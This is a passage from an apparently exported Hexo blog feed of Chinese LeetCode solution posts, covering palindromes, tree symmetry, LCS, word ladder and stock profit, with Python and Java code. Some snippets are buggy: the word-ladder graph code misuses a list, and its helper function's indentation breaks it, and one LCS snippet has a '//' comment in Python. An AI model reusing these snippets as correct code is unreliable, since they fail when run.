j</span>):</span><br><span class="line">            <span class="keyword">if</span> dp[i][j] != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> dp[i][j]</span><br><span class="line">            <span class="keyword">if</span> isPalindrome(i, j):</span><br><span class="line">                dp[i][j] = s[i:j+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">return</span> dp[i][j]</span><br><span class="line">            r = helper(i+<span class="number">1</span>, j)</span><br><span class="line">            l = helper(i, j-<span class="number">1</span>)</span><br><span class="line">            dp[i][j] = r <span class="keyword">if</span> <span class="built_in">len</span>(r) &gt; <span class="built_in">len</span>(l) <span class="keyword">else</span> l</span><br><span class="line">            <span class="keyword">return</span> dp[i][j]</span><br><span class="line"></span><br><span class="line">        helper(<span class="number">0</span>, <span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="built_in">len</span>(s)-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>提交时 101&#x2F;103 测试用例通过， 最后两个超时了。分析原因，代码中 <code>isPalindrome</code> 方法用于判断 <code>s[i:j+1]</code> 是否是回文字符串，此处子没有缓存结果导致子问题重复计算，参考 <a href="https://leetcode.com/iberryful">Berry</a> 大神的解法做出如下改进：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">            </span><br><span class="line">        dp = [[<span class="string">&quot;&quot;</span>] * <span class="built_in">len</span>(s) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">i, j</span>):</span><br><span class="line">            <span class="keyword">if</span> i &gt; j:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> dp[i][j] != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> dp[i][j]</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                dp[i][j] = s[i]</span><br><span class="line">                <span class="keyword">return</span> dp[i][j]</span><br><span class="line">            <span class="keyword">if</span> s[i] == s[j]:</span><br><span class="line">                mid = helper(i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(mid) == j - i + <span class="number">1</span> - <span class="number">2</span>:</span><br><span class="line">                    dp[i][j] = s[i:j+<span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">return</span> dp[i][j]</span><br><span class="line">            </span><br><span class="line">            r = helper(i+<span class="number">1</span>, j)</span><br><span class="line">            l = helper(i, j-<span class="number">1</span>)</span><br><span class="line">            dp[i][j] = r <span class="keyword">if</span> <span class="built_in">len</span>(r) &gt; <span class="built_in">len</span>(l) <span class="keyword">else</span> l</span><br><span class="line">            <span class="keyword">return</span> dp[i][j]</span><br><span class="line"></span><br><span class="line">        helper(<span class="number">0</span>, <span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="built_in">len</span>(s)-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>如果 <code>s[i] == s[j]</code>，递归对 <code>[i+1, j-1]</code> 区间求解，如果解恰的长度恰好等于 <code>j - i + 1 - 2</code>，则说明<code>s[i:j+1]</code> 是回文字串。</p>
<p><strong>改进:</strong></p>
<p>使用 lru_cache 可以对函数结果进行缓存，结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"><span class="meta">        @lru_cache(<span class="params"><span class="literal">None</span></span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i, j</span>):</span><br><span class="line">            <span class="keyword">if</span> i &gt; j:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">return</span> s[i]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> s[i] == s[j]:</span><br><span class="line">                mid = dfs(i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(mid) == j - i + <span class="number">1</span> - <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">return</span> s[i:j+<span class="number">1</span>]</span><br><span class="line">                </span><br><span class="line">            l, r = dfs(i, j-<span class="number">1</span>), dfs(i+<span class="number">1</span>, j)</span><br><span class="line">            <span class="keyword">return</span> l <span class="keyword">if</span> <span class="built_in">len</span>(l) &gt; <span class="built_in">len</span>(r) <span class="keyword">else</span> r</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-101 —— Symmetric Tree</title>
    <url>/fundamental/algorithm/lc-101-symmetric-tree/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p>
<p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"> / \ / \</span><br><span class="line">3  4 4  3</span><br></pre></td></tr></table></figure>

 <span id="more"></span>

<p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">2   2</span><br><span class="line"> \   \</span><br><span class="line"> 3    3</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong><br>Bonus points if you could solve it both recursively and iteratively.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>如果一个树是镜像树，那么这颗树有如下特点，</p>
<ol>
<li>左子树的 left-root-right 遍历和右子树的 right-root-left 遍历结果一致</li>
<li>左子树的左节点和右子树的右节点值相等，并且左子树的左子树是右子树的右子树的镜像</li>
<li>左子树的右节点和右子树的左节点值相等，并且左子树的右子树是右子树的左子树的镜像</li>
</ol>
<p>根据第 1 条特点可以写出非递归算法，根据 2、3 两条可以写出递归算法。</p>
<h2 id="递归写法"><a href="#递归写法" class="headerlink" title="递归写法"></a>递归写法</h2><p>根据分析得出的 2、3 特性，代码实现如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root == <span class="literal">null</span> || isIndentical(root.left, root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isIndentical</span><span class="params">(TreeNode front, TreeNode back)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (front == <span class="literal">null</span> || back == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> front == back;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (back.val != front.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> isIndentical(front.right, back.left) </span><br><span class="line">            &amp;&amp; isIndentical(front.left, back.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交后，得分不高，运行时打败 31%。</p>
<h2 id="非递归解法"><a href="#非递归解法" class="headerlink" title="非递归解法"></a>非递归解法</h2><p>未完，待续…</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-100 —— Same Tree</title>
    <url>/fundamental/algorithm/lc-100-same-tree/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given two binary trees, write a function to check if they are the same or not.</p>
<p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>处理树的问题一般都离不开递归的思想，我们先把问题分解为两个子问题，</p>
<ol>
<li>根节点相等</li>
<li>两颗树的左子树和右子树分别相等</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>基于以上分析不难写出代码，如下，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">null</span> || q == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> p == q;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> p.val == q.val &amp;&amp; isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>哈哈，提交后一遍过了，写了这么久终于实现了第一次 bugfree，值得纪念。</strong></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-1143 Longest Common Subsequence</title>
    <url>/fundamental/algorithm/lc-1143-longest-common-subsequence/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given two strings <code>text1</code> and <code>text2</code>, return the length of their longest common subsequence.</p>
<p>A <em>subsequence</em> of a string is a new string generated from the original string with some characters(can be none) deleted without changing the relative order of the remaining characters. (eg, “ace” is a subsequence of “abcde” while “aec” is not). A <em>common subsequence</em> of two strings is a subsequence that is common to both strings.</p>
<p>If there is no common subsequence, return 0.</p>
 <span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: text1 = &quot;abcde&quot;, text2 = &quot;ace&quot; </span><br><span class="line">Output: 3  </span><br><span class="line">Explanation: The longest common subsequence is &quot;ace&quot; and its length is 3.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: text1 = &quot;abc&quot;, text2 = &quot;abc&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The longest common subsequence is &quot;abc&quot; and its length is 3.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: text1 = &quot;abc&quot;, text2 = &quot;def&quot;</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: There is no such common subsequence, so the result is 0.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= text1.length &lt;= 1000</code></li>
<li><code>1 &lt;= text2.length &lt;= 1000</code></li>
<li>The input strings consist of lowercase English characters only.</li>
</ul>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这是经典的最长公共字串(LCS)问题，给定两个字符串，求他们的最长字串的长度。显然，这是一个动态规划问题，这类问题可以有很多可行解，每个解都对应一个值，本例中我们只需要找最优值即可，并不需要刻画最优解。如下案例，X 和 Y 的最长公共子串有 4 个（最优解有 4 个），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">X = <span class="string">&quot;abcde&quot;</span></span><br><span class="line">Y = <span class="string">&quot;acbed&quot;</span></span><br><span class="line">LCS = [<span class="string">&quot;ace&quot;</span>,<span class="string">&quot;abd&quot;</span>,<span class="string">&quot;abe&quot;</span>, <span class="string">&quot;acd&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>我们通常按照如下 4 个步骤来设计一个动态规划算法：</p>
<ol>
<li>刻画<strong>最优解</strong>的结构特征</li>
<li>递归定义<strong>最优解的值</strong></li>
<li>计算最优解的值，通常采用<strong>自底向上</strong>的方法</li>
<li>利用计算出的信息构造一个最优解</li>
</ol>
<h2 id="步骤1：刻画最优解的结构特征"><a href="#步骤1：刻画最优解的结构特征" class="headerlink" title="步骤1：刻画最优解的结构特征"></a>步骤1：刻画最优解的结构特征</h2><p>按照动态如上给出的求解步骤，我们首先刻画最优解的结构特征，</p>
<p>设 $ X &#x3D; &lt;x_1, x_2, …, x_m&gt;, Y &#x3D; &lt;y_1, y_2, …, y_n&gt; $，其中$Z &#x3D; &lt;z_1, z_2, …, z_k&gt; $ 是 X 和 Y 的一个最长公共字串，记为 $LCS(X, Y) &#x3D; Z$。</p>
<p>那么 Z 的最后一位$z_k$ 至少于 X 和 Y 中的最后一位的其中之一相等（也可以都相等），参考如下案例便于理解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    X = <span class="string">&quot;abcde&quot;</span></span><br><span class="line">    Y = <span class="string">&quot;acbed&quot;</span></span><br><span class="line">    Z = <span class="string">&quot;ace&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    X = <span class="string">&quot;abcde&quot;</span></span><br><span class="line">    Y = <span class="string">&quot;acbed&quot;</span></span><br><span class="line">    Z = <span class="string">&quot;acd&quot;</span>  </span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    X = <span class="string">&quot;abcde&quot;</span></span><br><span class="line">    Y = <span class="string">&quot;acbe&quot;</span></span><br><span class="line">    Z = <span class="string">&quot;ace&quot;</span></span><br></pre></td></tr></table></figure>

<p>基于以上情况，</p>
<ol>
<li>如果 X 和 Y 最后一位相等，则 $z_k &#x3D; x_m &#x3D; y_n 且 z_{k-1} \in LCS(X, Y)$</li>
<li>如果 X 和 Y 的最后一位不等，当  $z_k \neq  x_m$ 时，$ z \in LCS(X_{m-1}, Y)$</li>
<li>如果 X 和 Y 的最后一位不等，当  $z_k \neq  y_n$ 时，$ z \in LCS(Y_{n-1}, X)$</li>
</ol>
<h2 id="步骤2：递归定义最优解的值"><a href="#步骤2：递归定义最优解的值" class="headerlink" title="步骤2：递归定义最优解的值"></a>步骤2：递归定义最优解的值</h2><p>分治是将问题化为互不相交的子问题，然后递归的求解子问题，最后将子问题的解组合起来，求出原问题的解。而动态规划适用于子问题重叠的情况，原问题的最优解是由子问题最优解组合而成，求解原问题的解只需要求解部分子问题的解。</p>
<p>按照动态规划的求解步骤，第二步是递归定义最优解的值，在本例中，最优解的值即为最长公共字串的长度。定义 $c[i, j] &#x3D; lcslen(X_i, Y_j)$ 表示 X 的前 i 个元素和 Y 的前 j 个元素构成的最优解的值，则</p>
<p><img src="/images/2019-08/lc-1143-01.gif"></p>
<h2 id="步骤3：计算最优解的值"><a href="#步骤3：计算最优解的值" class="headerlink" title="步骤3：计算最优解的值"></a>步骤3：计算最优解的值</h2><p>有了前两步的分析，计算最优解的值就已经看到曙光了，使用自底向上的方法，递推式的从问题最小规模开始计算，递推到原问题规模时结束。本例中，如果 i 或 j 等于0 (可理解为空字符串与任何字符串的最大公共字串长度为0)时，<code>c[i, 0] = 0, c[0, j] = 0</code>，所以可以如下初始化 c:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">len</span>(x)</span><br><span class="line">n = <span class="built_in">len</span>(y)</span><br><span class="line">// 问题从规模 <span class="number">0</span> 开始到规模 m 需要 m + <span class="number">1</span> 个存储空间</span><br><span class="line">c = [[<span class="number">0</span>] * (m + <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<p>然后如下递推计算各个状态下的最优解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> x[i-<span class="number">1</span>] == y[j-<span class="number">1</span>]:</span><br><span class="line">            c[i][j] = c[i-<span class="number">1</span>][j-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	c[i][j] = <span class="built_in">max</span>(c[i-<span class="number">1</span>][j], c[i][j-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>其中 x[i-1] 代表的是第 i 号元素，计数从 1 开始，元素下标从 0 开始</p>
<p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestCommonSubsequence</span>(<span class="params">self, x: <span class="built_in">str</span>, y: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        m = <span class="built_in">len</span>(x)</span><br><span class="line">        n = <span class="built_in">len</span>(y)</span><br><span class="line">        c = [[<span class="number">0</span>] * (n + <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> x[i-<span class="number">1</span>] == y[j-<span class="number">1</span>]:</span><br><span class="line">                    c[i][j] = c[i-<span class="number">1</span>][j-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    c[i][j] = <span class="built_in">max</span>(c[i-<span class="number">1</span>][j], c[i][j-<span class="number">1</span>])</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">return</span> c[m][n]</span><br></pre></td></tr></table></figure>

<p>提交后，成功 AC。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-127 Word Ladder</title>
    <url>/fundamental/algorithm/lc-127-word-ladder/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p><a href="https://leetcode.com/problems/word-ladder/">https://leetcode.com/problems/word-ladder/</a></p>
<p>给定两个单词 <code>beginWord</code> ，<code>endWord</code> 和一组单词列表，求从 <code>beginWord</code> 到 <code>endWord</code> 的最短转换序列的长度，其中转换规则如下：</p>
<ol>
<li>每次只能转换一个字母</li>
<li>每次转换后的单词都必须在给定的单词列表中</li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>如下案例,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">beginWord = &quot;hit&quot;,</span><br><span class="line">endWord = &quot;cog&quot;,</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line"></span><br><span class="line">Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,</span><br><span class="line">return its length 5.</span><br></pre></td></tr></table></figure>

<p>首先使用（给定的单词和单词列表中的）每个单词作为一个顶点，构建连通图，如果两个顶点之间只相差一个字母，则两点之间可达。作图如下，</p>
<p><img src="/images/2019-08/lc-127-01.png"></p>
<p>显然，问题的本质在于图的搜索，即从 <code>beginWord</code> 起始搜索 <code>endWord</code>，如果找到，返回最小路径，否则返回 0。那么问题分两部：</p>
<ol>
<li>构建无向图</li>
<li>搜索</li>
</ol>
<h2 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h2><ol>
<li><p>列表构建无向图，使用二维 map。其中两个顶点的连通性有他们之间的字母差异数决定，当且仅当两顶点的单词相差 1 个字母时连通。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grahp = []</span><br><span class="line">wordList.append(beginWord)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> wordList:</span><br><span class="line">  <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> graph:</span><br><span class="line">    grahp[x] = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> wordList:</span><br><span class="line">    	grahp[x][y] = acessiable(x, y)</span><br></pre></td></tr></table></figure>

<p> 其中 <code>accessiable</code> 函数如下定义：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">acessiable</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(a) != <span class="built_in">len</span>(b):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  i, diff = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(a):</span><br><span class="line">    <span class="keyword">if</span> a[i] != b[i]:</span><br><span class="line">      diff += <span class="number">1</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> diff == <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Graph</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-121 Best Time to Buy and Sell Stock</title>
    <url>/fundamental/algorithm/lc-121-best-time-to-buy-and-sell-stock/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Say you have an array for which the <em>i</em>th element is the price of a given stock on day <em>i</em>.</p>
<p>If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p>Note that you cannot sell a stock before you buy one.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [7,1,5,3,6,4]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5.</span><br><span class="line">             Not 7-1 = 6, as selling price needs to be larger than buying price.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [7,6,4,3,1]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: In this case, no transaction is done, i.e. max profit = 0.</span><br></pre></td></tr></table></figure>



<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>分治和动态规划：不相交的子问题、相交的子问题</p>
<p>从斐波那契开始</p>
<p>最优解 vs 最优解的值</p>
<p>朴素递归 —— 自顶向下</p>
<p>因为子问题一般是重叠的，采用自顶向下的方式计算最优解的值会重复对多个相同的子问题求解，时间复杂度和空间复杂度都会指数增长。而自底向上的求解过程是递推式的进行，会先计算最基础的子问题，然后将子问题的结果缓存（可以仅仅缓存和下一个状态相关的子问题的解），所以我们一般采用自底向上的方式求解最优解的值。</p>
<p><strong>带备忘录的自顶向下</strong></p>
<p>一般步骤：</p>
<ol>
<li>刻画一个最优解的结构特征。</li>
<li>递归定义最优解的值。</li>
<li>计算最优解的值，通常采用<strong>自底向上</strong>的方法。</li>
<li>利用计算出的信息构造一个最有解（可选）。</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == prices || prices.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[prices.length];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            min = Math.min(min, prices[i]);</span><br><span class="line">            dp[i] = Math.max(dp[i-<span class="number">1</span>], prices[i]-min);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[prices.length - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>内存优化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == prices || prices.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">profit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            min = Math.min(min, prices[i]);</span><br><span class="line">            profit = Math.max(profit, prices[i]-min);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> 